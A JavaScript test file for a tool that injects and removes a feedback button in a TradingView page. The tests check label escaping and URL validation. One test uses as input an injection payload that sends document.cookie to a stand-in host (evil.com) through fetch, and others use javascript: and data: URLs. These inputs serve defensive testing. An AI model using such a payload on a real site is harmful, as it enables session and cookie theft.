/**
 * Tests for the feedback-button feature.
 * Fully offline — CDP `evaluate` is mocked via the _deps injection hook,
 * so no TradingView connection is needed.
 *
 * Run: node --test tests/feedback.test.js
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { safeString } from '../src/connection.js';
import { addFeedbackButton, removeFeedbackButton } from '../src/core/feedback.js';

// ── Mock helpers ─────────────────────────────────────────────────────────

function mockEval(returnValue) {
  const calls = [];
  const fn = async (expr) => { calls.push(expr); return returnValue; };
  fn.calls = calls;
  return fn;
}

function mockDeps(returnValue) {
  const evaluate = mockEval(returnValue);
  return { _deps: { evaluate }, evaluate };
}

// ── addFeedbackButton ────────────────────────────────────────────────────

describe('addFeedbackButton()', () => {
  it('injects a button and reports success', async () => {
    const { _deps, evaluate } = mockDeps({ injected: true });
    const r = await addFeedbackButton({ _deps });
    assert.equal(r.success, true);
    assert.equal(r.injected, true);
    assert.equal(evaluate.calls.length, 1);
    const call = evaluate.calls[0];
    assert.ok(call.includes('createElement'), 'builds a DOM element');
    assert.ok(call.includes('appendChild'), 'appends to the document');
    assert.ok(call.includes('addEventListener'), 'wires a click handler');
  });

  it('uses default label and URL when none given', async () => {
    const { _deps, evaluate } = mockDeps({ injected: true });
    const r = await addFeedbackButton({ _deps });
    assert.equal(r.label, 'Give Feedback');
    assert.match(r.url, /^https:\/\/github\.com\/.*\/issues\/new$/);
    assert.ok(evaluate.calls[0].includes(safeString('Give Feedback')), 'default label via safeString');
  });

  it('treats explicit undefined label/url as defaults (CLI passes undefined)', async () => {
    const { _deps } = mockDeps({ injected: true });
    const r = await addFeedbackButton({ label: undefined, url: undefined, _deps });
    assert.equal(r.label, 'Give Feedback');
    assert.match(r.url, /^https:\/\//);
  });

  it('passes a custom label through safeString', async () => {
    const { _deps, evaluate } = mockDeps({ injected: true });
    await addFeedbackButton({ label: 'Report a bug', url: 'https://example.com/feedback', _deps });
    const call = evaluate.calls[0];
    assert.ok(call.includes(safeString('Report a bug')), 'label is JSON-escaped');
    assert.ok(call.includes(safeString('https://example.com/feedback')), 'url is JSON-escaped');
  });

  it('sanitizes an injection payload in the label', async () => {
    const { _deps, evaluate } = mockDeps({ injected: true });
    const payload = "'); fetch('https://evil.com/steal?c='+document.cookie); ('";
    await addFeedbackButton({ label: payload, url: 'https://example.com', _deps });
    const call = evaluate.calls[0];
    assert.ok(call.includes(safeString(payload)), 'payload is JSON-escaped in evaluate call');
    assert.ok(!call.includes("textContent = '" + payload), 'no raw single-quoted interpolation');
  });

  it('rejects a non-http(s) URL (javascript: scheme)', async () => {
    const { _deps, evaluate } = mockDeps({ injected: true });
    await assert.rejects(
      () => addFeedbackButton({ url: 'javascript:alert(1)', _deps }),
      /url must be an http\(s\) URL/,
    );
    assert.equal(evaluate.calls.length, 0, 'never reaches evaluate when URL is rejected');
  });

  it('rejects a data: URL', async () => {
    const { _deps } = mockDeps({ injected: true });
    await assert.rejects(
      () => addFeedbackButton({ url: 'data:text/html,<script>1</script>', _deps }),
      /url must be an http\(s\) URL/,
    );
  });

  it('reports injected:false when the element is not found', async () => {
    const { _deps } = mockDeps({ injected: false });
    const r = await addFeedbackButton({ _deps });
    assert.equal(r.success, true);
    assert.equal(r.injected, false);
  });
});

// ── removeFeedbackButton ─────────────────────────────────────────────────

describe('removeFeedbackButton()', () => {
  it('targets the feedback button id and reports removal', async () => {
    const { _deps, evaluate } = mockDeps({ removed: true });
    const r = await removeFeedbackButton({ _deps });
    assert.equal(r.success, true);
    assert.equal(r.removed, true);
    assert.ok(evaluate.calls[0].includes(safeString('tv-mcp-feedback-btn')), 'looks up the button by id');
    assert.ok(evaluate.calls[0].includes('.remove()'), 'removes the element');
  });

  it('reports removed:false when no button exists', async () => {
    const { _deps } = mockDeps({ removed: false });
    const r = await removeFeedbackButton({ _deps });
    assert.equal(r.success, true);
    assert.equal(r.removed, false);
  });
});
